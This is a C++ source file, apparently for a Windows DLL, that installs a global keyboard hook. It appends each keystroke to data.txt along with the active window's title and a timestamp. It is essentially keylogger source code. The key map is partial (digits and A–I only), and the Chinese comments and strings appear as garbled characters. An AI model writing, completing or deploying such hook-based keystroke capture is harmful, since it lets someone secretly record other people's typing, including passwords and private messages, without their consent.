#include "keyHook.h"
#include<fstream>
#include<iostream>
#include<time.h>

#include <sstream>
using namespace std;

string GetKey(WPARAM wParam) {
	string value="δ����";
	switch (wParam)
	{
	case 0x30:
		value = "0";
		break;
	case 0x31:
		value = "1";
		break;
	case 0x32:
		value = "2";
		break;
	case 0x33:
		value = "3";
		break;
	case 0x34:
		value = "4";
		break;
	case 0x35:
		value = "5";
		break;
	case 0x36:
		value = "6";
		break;
	case 0x37:
		value = "7";
		break;
	case 0x38:
		value = "8";
		break;
	case 0x39:
		value = "9";
		break;
	case 0x41:
		value = "A";
		break;
	case 0x42:
		value = "B";
		break;
	case 0x43:
		value = "C";
		break;
	case 0x44:
		value = "D";
		break;
	case 0x45:
		value = "E";
		break;
	case 0x46:
		value = "F";
		break;
	case 0x47:
		value = "G";
		break;
	case 0x48:
		value = "H";
		break;
	case 0x49:
		value = "I";
		break;
	
	default:
		break;
	}
	return value;
}

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam) {

	//��ȡ��ǰ����
	HWND hWnd = GetActiveWindow();

	if (NULL == hWnd) {
		hWnd = GetForegroundWindow();
		if (NULL == hWnd) {
			return CallNextHookEx(hHook, code, wParam, lParam);
		}

	}

	char windowText[MAX_PATH] = { 0 };
	GetWindowTextA(hWnd, windowText, MAX_PATH);

	

	//��ȡ��ֵ

	//���浽�ļ���
	
	
	SYSTEMTIME sysTime = { 0 };
	GetSystemTime(&sysTime);
	
	
	
	
		fstream f;
		//׷��д��,��ԭ�������ϼ���ios::app 
		f.open("data.txt", ios::out | ios::app);
		//��������д������� 
		f << "Ӧ�ã�" << windowText << "���룺" << GetKey(wParam) <<"ʱ��" << "year:" << sysTime.wYear << " month:" << sysTime.wMonth << " day:" << sysTime.wDay
			<< " hour:" << sysTime.wHour + 8 << " minute:" << sysTime.wMinute << " second:" << sysTime.wSecond << " milliseconds:" << sysTime.wMilliseconds<<endl;
		f.close();
		

	
	

	return CallNextHookEx(hHook, code, wParam, lParam);
}

	

bool installHook() {
	//MessageBox(NULL, L"��װ����", L"dll��", NULL);

	hHook = SetWindowsHookEx(WH_KEYBOARD,hookProc,GetModuleHandle("keyHook"),NULL);
	if (NULL == hHook) {
		MessageBox(NULL, "��װʧ��", "dll��", NULL);
	} else{
		MessageBox(NULL, "�ɹ�", "dll��", NULL);
	}
	return true;
}

bool unInstallHook() {
	
	return UnhookWindowsHookEx(hHook);
}
